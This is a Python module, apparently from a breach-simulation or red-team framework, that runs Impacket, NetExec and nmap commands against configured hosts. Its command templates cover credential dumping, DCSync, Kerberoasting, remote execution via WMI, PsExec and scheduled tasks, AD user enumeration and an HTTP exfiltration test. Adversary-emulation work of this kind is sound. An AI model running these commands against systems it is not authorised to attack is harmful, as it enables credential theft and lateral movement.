"""Native execution bridge — runs Impacket/NetExec/Nmap directly via subprocess.

No Docker, no Kali, no containers. Tools are installed via pip on the host machine.
Works on Windows (Tejesh) and Linux/Mac.

Requirements:
- pip install impacket
- NetExec: pip install netexec (or standalone .exe on Windows)
- nmap: install from nmap.org (optional)
"""
from __future__ import annotations

import shutil
import subprocess
import sys
import time

from ..catalog.spec import TechniqueSpec
from ..world import AssetInstance
from .base import ExecutionBridge, ExecutionResult, VMBinding

# Engine technique key → native command template
# Placeholders: {host}, {user}, {password}, {domain}
TECHNIQUE_NATIVE: dict[str, dict] = {
    "lsass_dump": {
        "tool": "impacket-secretsdump",
        "command": "impacket-secretsdump {domain}/{user}:{password}@{host}",
        "description": "Dump LSASS credentials via DRSUAPI",
    },
    "kerberoast": {
        "tool": "impacket-GetUserSPNs",
        "command": "impacket-GetUserSPNs -request -dc-ip {host} {domain}/{user}:{password}",
        "description": "Request TGS tickets for offline cracking",
    },
    "dcsync": {
        "tool": "impacket-secretsdump",
        "command": "impacket-secretsdump -just-dc {domain}/{user}:{password}@{host}",
        "description": "DCSync — replicate AD hashes via DRSUAPI",
    },
    "lateral_wmi": {
        "tool": "impacket-wmiexec",
        "command": 'impacket-wmiexec {domain}/{user}:{password}@{host} "whoami && hostname"',
        "description": "Remote execution via WMI",
    },
    "lateral_psexec": {
        "tool": "impacket-psexec",
        "command": 'impacket-psexec {domain}/{user}:{password}@{host} "whoami && hostname"',
        "description": "Remote execution via SMB service creation",
    },
    "persist_task": {
        "tool": "impacket-atexec",
        "command": 'impacket-atexec {domain}/{user}:{password}@{host} "cmd /c whoami"',
        "description": "Execute command via scheduled task",
    },
    "discovery_ad": {
        "tool": "nxc",
        "command": "nxc ldap {host} -u {user} -p {password} --users",
        "description": "Enumerate AD users via LDAP",
    },
    "exfil_http": {
        "tool": "python",
        "command": sys.executable + ' -c "import urllib.request; print(urllib.request.urlopen(\'http://{host}:8080/test\').status)"',
        "description": "Test HTTP exfiltration channel",
    },
    "lateral_rdp": {
        "tool": "nmap",
        "command": "nmap -p 3389 --open -Pn {host}",
        "description": "Check RDP port availability",
    },
}


class NativeExecutionBridge(ExecutionBridge):
    """Execute attacks using locally installed tools (no Docker)."""

    async def execute(
        self,
        spec: TechniqueSpec,
        target: AssetInstance,
        vm: VMBinding,
    ) -> ExecutionResult:
        mapping = TECHNIQUE_NATIVE.get(spec.key)
        if not mapping:
            return ExecutionResult(
                success=False, technique_key=spec.key, mitre_id=spec.mitre,
                error=f"No native mapping for technique {spec.key}",
            )

        # Check tool exists
        tool = mapping["tool"]
        if tool != "python" and not shutil.which(tool):
            return ExecutionResult(
                success=False, technique_key=spec.key, mitre_id=spec.mitre,
                error=f"Tool '{tool}' not found in PATH. Install: pip install impacket",
            )

        domain = vm.credential_ref or "WORKGROUP"
        command = mapping["command"].format(
            host=vm.host,
            user=vm.username,
            password=vm.password,
            domain=domain,
        )

        start = time.time()
        try:
            result = subprocess.run(
                command, shell=True,
                capture_output=True, text=True, timeout=120,
            )
            duration_ms = int((time.time() - start) * 1000)

            stdout = result.stdout[:2000] if result.stdout else ""
            stderr = result.stderr[:500] if result.stderr else ""
            success = result.returncode == 0 and len(result.stdout) > 10

            return ExecutionResult(
                success=success,
                technique_key=spec.key,
                mitre_id=spec.mitre,
                output=stdout or stderr,
                duration_ms=duration_ms,
                error=stderr if result.returncode != 0 else None,
            )
        except subprocess.TimeoutExpired:
            return ExecutionResult(
                success=False, technique_key=spec.key, mitre_id=spec.mitre,
                error=f"Command timed out after 120s",
                duration_ms=120000,
            )

    async def health_check(self, vm: VMBinding) -> bool:
        return shutil.which("impacket-secretsdump") is not None

    async def cleanup(
        self,
        spec: TechniqueSpec,
        target: AssetInstance,
        vm: VMBinding,
    ) -> bool:
        return True

    @staticmethod
    def check_tools() -> dict[str, bool]:
        """Check which attack tools are installed locally."""
        tools = ["impacket-secretsdump", "impacket-GetUserSPNs", "impacket-psexec",
                 "impacket-wmiexec", "impacket-atexec", "nxc", "nmap"]
        return {t: shutil.which(t) is not None for t in tools}
